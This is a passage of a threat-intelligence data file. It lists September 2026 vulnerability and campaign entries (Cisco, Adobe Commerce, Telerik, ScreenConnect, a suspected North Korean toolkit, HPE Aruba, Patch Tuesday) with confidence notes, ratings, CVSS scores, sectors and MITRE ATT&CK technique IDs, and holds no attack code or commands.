  "confNote": "Published Sep 2, 2026. Two CVSS 9.8 IOS XR CVEs are CWE groupings covering multiple underlying bugs, not single defects, so a per-CVE severity reading understates the spread. The Nexus 9000 flaw has no fixed-release table. The Fire Ant syslog-suppression reporting is separate Sygnia research, not part of this advisory set",
  "iocDate": "n/a — no exploitation reported",
  "admiralty": "A2",
  "severity": 4,
  "cvss": 9.8,
  "sectors": [
   "Communications",
   "Information Technology",
   "Government Facilities",
   "Financial Services"
  ],
  "attack": [
   "T1190 Exploit Public-Facing Application",
   "T1499 Endpoint Denial of Service",
   "T1562.002 Impair Defenses: Disable Windows Event Logging",
   "T1078 Valid Accounts",
   "T1557 Adversary-in-the-Middle"
  ]
 },
 "stylesmuggler": {
  "status": "new",
  "conf": "Vendor-confirmed exploited zero-day — Sansec forensic findings from live compromises, Adobe emergency hotfix and CVE assignment on Sep 7",
  "confNote": "High confidence on the vulnerability, the exploitation and the implant: Sansec found the campaign in a live incident, reproduced the unauthenticated chain on clean 2.4.7/2.4.8/2.4.9 installations, and Adobe issued CVE-2026-75650 at CVSS 10.0 with a hotfix. Indicator confidence is lower and decaying — the implant changed process name twice in three days and switched C2 transport from TLS/WebSockets to NTP-shaped UDP, and Sansec states it is still updating the advisory as the actors iterate. No file hashes were published in the reporting reviewed",
  "iocDate": "Sep 4–7, 2026 — Sansec advisory indicators, last updated Sep 7 20:45 UTC",
  "admiralty": "A1",
  "severity": 5,
  "cvss": 10,
  "sectors": [
   "Commercial Facilities",
   "Information Technology",
   "Financial Services"
  ],
  "attack": [
   "T1190 — Exploit Public-Facing Application",
   "T1221 — Template Injection",
   "T1059.004 — Command and Scripting Interpreter: Unix Shell",
   "T1036.005 — Masquerading: Match Legitimate Name or Location",
   "T1053.003 — Scheduled Task/Job: Cron",
   "T1071.001 — Application Layer Protocol: Web Protocols",
   "T1030 — Data Transfer Size Limits",
   "T1622 — Debugger Evasion",
   "T1614 — System Location Discovery"
  ]
 },
 "telerikrau": {
  "status": "new",
  "conf": "Vendor-patched flaws with a public working exploit — Progress advisory Jul 22, TantoSec tooling release Sep 7; no confirmed exploitation in the wild",
  "confNote": "High confidence on the mechanism and the fix: Progress published the CVEs and shipped 2026.2.708 on Jul 8, and TantoSec's write-up documents the chain end to end with released tooling. Exploitability is conditional — the target page must use RadAsyncUpload and its FileUploaded handler must read UploadResult, which is a non-default configuration — and reporting records no confirmed in-the-wild exploitation. No CVSS scores for the individual CVEs appeared in the sources reviewed",
  "iocDate": "Sep 7, 2026 — tooling published; no campaign indicators",
  "admiralty": "B2",
  "severity": 4,
  "cvss": null,
  "sectors": [
   "Information Technology",
   "Government Facilities",
   "Financial Services"
  ],
  "attack": [
   "T1190 — Exploit Public-Facing Application",
   "T1505.003 — Server Software Component: Web Shell",
   "T1620 — Reflective Code Loading",
   "T1027 — Obfuscated Files or Information",
   "T1574.002 — Hijack Execution Flow: DLL Side-Loading"
  ]
 },
 "screenconnectworm": {
  "status": "new",
  "conf": "Incident-response confirmation across multiple organisations — Huntress SOC telemetry, corroborated by a ConnectWise advisory",
  "confNote": "High confidence on the tradecraft and the propagation: Huntress observed the identical artefact set on unrelated endpoints in different organisations and identified the transfer-and-execute chain in the payloads, and ConnectWise responded with permission-level guidance. No CVE exists, so patch state is not the control. Indicator fidelity is mixed — the script filenames are generic, and Huntress described network connections without publishing addresses",
  "iocDate": "Aug 20 – Sep 3, 2026 — incidents and Huntress research",
  "admiralty": "A2",
  "severity": 4,
  "cvss": null,
  "sectors": [
   "All Sectors",
   "Information Technology",
   "Commercial Facilities"
  ],
  "attack": [
   "T1566 — Phishing",
   "T1219 — Remote Access Software",
   "T1059.005 — Command and Scripting Interpreter: Visual Basic",
   "T1059.001 — Command and Scripting Interpreter: PowerShell",
   "T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys",
   "T1570 — Lateral Tool Transfer",
   "T1070 — Indicator Removal"
  ]
 },
 "dprkted": {
  "status": "new",
  "conf": "Vendor threat research from incident artefacts — Rapid7 analysis of a compromised environment; attribution assessed rather than confirmed",
  "confNote": "High confidence on the toolkit and the tradecraft, which Rapid7 documents from recovered artefacts including the HAProxy-compiled plugin and CurlRAT. Attribution is an assessment: Rapid7 notes the artefacts and infrastructure point to watering-hole techniques previously used by APT37 and Lazarus and that the timeframe overlaps Operation SyncHole, and says a North Korean actor might be behind the campaign. No indicator table appeared in the reporting reviewed",
  "iocDate": "Late 2024 – Sep 7, 2026 — assessed period of use through publication",
  "admiralty": "B2",
  "severity": 4,
  "cvss": null,
  "sectors": [
   "Critical Manufacturing",
   "Communications",
   "Information Technology"
  ],
  "attack": [
   "T1190 — Exploit Public-Facing Application",
   "T1554 — Compromise Host Software Binary",
   "T1056.001 — Input Capture: Keylogging",
   "T1557 — Adversary-in-the-Middle",
   "T1189 — Drive-by Compromise",
   "T1071.001 — Application Layer Protocol: Web Protocols",
   "T1029 — Scheduled Transfer",
   "T1036.005 — Masquerading: Match Legitimate Name or Location",
   "T1070 — Indicator Removal"
  ]
 },
 "hpeaoscx": {
  "status": "new",
  "conf": "Vendor advisory — HPE Aruba Networking updates; no reported exploitation",
  "confNote": "Confidence rests on the vendor release and SecurityWeek's report of it. Nearly two dozen issues are grouped under one identifier with one score, so the CVE record understates the scope of the change; read the advisory for affected features. No exploitation reported and no indicators published",
  "iocDate": "Sep 4, 2026 — advisory published; no indicators",
  "admiralty": "B2",
  "severity": 3,
  "cvss": 9.8,
  "sectors": [
   "Communications",
   "Information Technology"
  ],
  "attack": [
   "T1190 — Exploit Public-Facing Application"
  ]
 },
 "patchtuesdaysep": {
  "status": "new",
  "conf": "Vendor-confirmed exploitation with no published detail — Microsoft Security Update Guide, corroborated across BleepingComputer, SecurityWeek, CybersecurityNews and others",
  "confNote": "High confidence that both flaws are exploited in the wild: Microsoft marks them exploited in the Security Update Guide and every outlet reviewed reports the same two CVEs at CVSS 7.8, both rated Important. Nothing further is known — Microsoft published no actor, no targeting and no exploitation chain, and both are marked exploited but not publicly disclosed, so there are no indicators. Headline totals are not reliable across sources: counts range from 966 to 996 and Critical counts from 105 to 121, depending on whether the 204 cloud fixes released earlier in the month and 25 republished non-Microsoft CVEs are included; the Office split is reported as both 111 and 222 and that discrepancy is unresolved. The 20-wormable assessment is ZDI's judgement, not a Microsoft statement",
  "iocDate": "Sep 8, 2026 — patches released; no indicators published",
  "admiralty": "A1",
  "severity": 5,
  "cvss": 7.8,
  "sectors": [
   "All Sectors",
   "Information Technology",
   "Government Facilities"
  ],
  "attack": [
   "T1068 — Exploitation for Privilege Escalation",
   "T1548 — Abuse Elevation Control Mechanism",
   "T1211 — Exploitation for Defense Evasion",
   "T1547 — Boot or Logon Autostart Execution",
   "T1134 — Access Token Manipulation"
  ]
 }
},
};
